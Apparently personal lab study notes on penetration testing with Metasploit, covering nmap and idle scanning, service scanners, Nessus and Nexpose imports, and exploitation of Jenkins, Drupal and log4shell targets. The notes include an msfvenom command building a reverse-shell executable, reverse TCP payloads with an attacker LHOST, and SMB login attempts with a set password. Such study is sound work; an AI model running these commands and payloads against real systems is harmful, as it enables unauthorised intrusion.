```
ls /usr/share/metasploit-framework/scripts/resoure # prebuild metasploit scripts
sudo msfconsole -r ~/Desktop/start_listener.rc # run a script

# create a payload with MSFvenom: 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacher IP address> -f exe -o payload.exe
```

#  Intelligence Gathering

The goal of Intelligence Gathering is to gain accurate information about the targets without revealing our presence, learn how the organization operates, and determine the best way in.

## Passive Information Gathering

```
whois trustedsec.com
https://searchdns.netcraft.com 
sudo dig mx trustedsec.com # look for email servers
```

## Active Information Gathering

```
sudo nmap -sS -Pn scanme.nmap.org # -sS: stealth scan -Pn: no ping 
# -A: OS detection, version detection, script scanning, and trace route
sudo namp -Pn -sS -A scanme.nmap.org 

```

### Importing Nmap Results into Metasploit

```
sudo systemctl start postgresql
sudo msfdb init # initialize the database
sudo netstat -antp | grep postgres # verify PostgreSQL is running
# scan a range of ip address and put the results in an xml file
sudo nmap -Pn -sS -A -oX Results-Subnet1.xml 192.168.1.0/24
```

```
msfconsole
db_status # check db status in Metasploit
db_import Results-Subnet1.xml # inports nmap results
hosts -c address
```

### Performing TCP Idle Scans

Want to run nmap by spoofing and idle IP address on the network. This approach is more stealthy

First use msf to find an idle IP address:

```
use auxiliary/scanner/ip/ipidseq
show options
set RHOSTS 192.168.1.0/24
set THREADS 50
run

# now use the idle IP address with nmap to run a scan on a host
nmap -PN -sI <spoof ip> <target ip>
db_nmap -sS -A <target ip> # run nmap with msfconsole, add results to database
services # shows database
```

### Port Scanning with Metasploit

```
search portscan # list scanner
use auxiliary/scanners/portscan/syn
set RHOSTS 192.168.1.155
set THREADS 50
run
```

# Targeted Scanning

### Scanning for Server Message Block (SMB)

```
use auxiliary/scanner/smb/smb_version
show options
set RHOSTS 10.10.11.129
run
hosts -c address,os_flavor,vulns,svcs,workspace
vulns
```

### Hunting for Poorly Configured Microsoft SQL Servers

```
use auxiliary/scanners/mysql/mssql_ping
show options
set RHOSTS 10.10.1.0/24
set THREADS 255
run
```

### Scanning for S3 Buckets

```
sudo pip3 install s3scanner
s3scanner scan --bucket flaws2.cloud
```

### Scanning for SSH Server Version

```
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
set THREADS 50
run
```

### Scanning for FTP Servers

```
use auxiliary/scanner/ftp/ftp_version
show options
set RHOSTS 192.168.1.0/24
set THREADS 255
run
```

Check if an FTP server allows anonymous login:

```
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.1.155
set THREADS 50
run
```

### Sweeping for Simple Network Management Protocol (SNMP)

```
use auxiliary/scanner/snmp/snmp_login
set RHOSTS 192.168.1.0/24
set THREADS 50
run
```

# Vulnerability Analysis

### The Basic Vulnerabiliby Scan

```
sudo nc 192.168.1.203 80
```

### Scanning with Nexpose

```
https://<your ip address>:3780
```

### Importing Results into Metasploit

```
sudo msfdb run # starts the Metasploit database

db_import ~/Downloads/host_195.xml
hosts -c address,svcs,vulns
vulns
```

### Running Nexpose in MSFconsole

```
workspace -a nexpose-no-creds
workspace noxpose-no-creds
load nexpose
help

nexpose_connect -h
nexpose_connect username:password@192.168.1.206 OK
nexpose_scan 192.168.1.195
hosts -c address,svcs,vulns
vulns
```

### Scanning with Nessus

```
sudo systemctl start nessusd.service
https://localhost:8834
```

### Importing Results into Metasploit

```
workspace -a nessus
workspace nessus
db_import /tmp/nessus_report_Host_195.nessus
hosts -c address,svcs,vulns
vulns
```

### Nessue Scanning in Metasploit

```
workspace -a nessus2
workspace nessus2
load nessus # loads nessus module
nessus_connect username:password@192.168.1.101::8834 ok # our authentication
nessus_policy_list
nessus_scan_new
# nessus_scan_new <Policy UUID> <scan_name> <Description> <targets>
nessus_scan_new 123245 bridge_scan scan_description 10.0.1.19 # this only creates the scan
nessus_scan_launch 21 # runs the created scan
nessus_scan_list # display scan progress
nessus_scan_export 21 Nessus # export scan
nessus_report_download 21 2007425285 # download a local copy of the report 
nessus_db_import 21 # import report to the database
hosts -c address,svcs,vulns
```

### Specialty Vulnerability Scanners

#### Validating SMB Logins

```
use auxiliary/scanner/smb/smb_login
show options
set RHOSTS 192.168.1.150-155
set SMBUser Administrator
set SMBPass s3cr3t
run
```

### Finding Scanners for Recent Exploits

```
https://www.rapid7.com/db/
```

# The Joy Of Exploitation

```
show exploits # shows all exploit modules
show auxiliary # shows all aux modules
show options # show module options if a module is loaded
#              show global options if no module is loaded
```

### Searching for an Exploit

```
search name:apache type:exploit date:YYYY # sharch for apache exploits
search log4j #

# searchsploit:
searchsploit log4j # searches the Exploit DB
searchsploit -p 50592 # view details of a specific exploit

# info
info exploit/multi/http/log4shell_header_injection
```

### Selecting an Exploit

```
use exploit/multi/http/log4shell_header_injection # loads exploit
back # unloads exploit
show options
show payloads # show exploit payloads
set PAYLOAD java/shell_reverse_tcp # selects a payload
show options
set LHOST <attacker IP address>

show targets # show target options. If the target OS is know then it's best to set it
# rather than using the 'Automatic' option

#set and unset
# setg and unsetg - sets global options
setg LHOST 10.0.2.41
save # saves global options
# options are saved at /root/.msfx/config <- can delete this to reset everything
exploit # runs the selected exploit
```

### Exploiting a Windows Machine

```
sudo msfconsole -q
nmap -sT -Pn -A 192.168.1.102 -Pn-65355 --script=http-enum.nse
# -sT: stealth TCP connect
# -A: advanced operating detection
# -Pn: This disables host discovery
# -script=http-enum.nse: cript tries to enumerate common HTTP directories (like /admin, 
# /login, etc.) and files to identify potentially sensitive or vulnerable areas on web 
# servers
search jenkins type:exploit platform:windows
use 2 # selects the 2nd listed exploit
set TARGETURI /
exploit

# running commands on the Window's target with meterpreter (exploit successful)
meterpreter> dir
meterpreter> whoami
```

### Exploiting a Windows Machine - My notes:

```
sudo nmap -sS -sV -O -p- 192.168.56.3 # port scan, shows port 8484 open amoung many others
sudo nmap -sT -Pn -A 192.168.56.3 -p 8484 -sC # shows Jenkins 
search jenkins type:exploit platform:windows rank:excellent
use 2
show options

```



### Exploiting an Ubuntu Machine

```
nmap -sT -A 192.168.1.101
search type:exploit platform:unix rank:excellent drupal
use 0
set RHOSTS 192.168.1.101
show options
exploit

# if the exploit is successful then can use the shell
ls
```







win2k8: 192.168.56.3

ub1404: 172.28.128.3
